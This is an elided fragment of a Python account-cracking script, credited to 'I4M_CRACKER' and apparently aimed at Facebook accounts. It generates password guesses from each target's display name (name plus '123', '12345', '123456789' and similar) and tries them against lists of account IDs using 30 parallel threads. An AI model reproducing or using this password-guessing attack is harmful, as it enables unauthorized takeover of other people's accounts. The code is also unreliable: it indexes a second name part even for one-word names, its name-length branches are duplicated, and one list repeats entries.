# Coding by Romi Afrizal > github.com/Mark-Zuck
# Recode by Artha ^•^
...
author = 'I4M_CRACKER'
fb_me = 'NEED'
github = 'https://github.com/raminhakim'
			...
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						...
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"123456789"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"123456789"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"123456789"]
			...
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						...
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"123456789", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"123456789"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"123456789"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"123456789"]
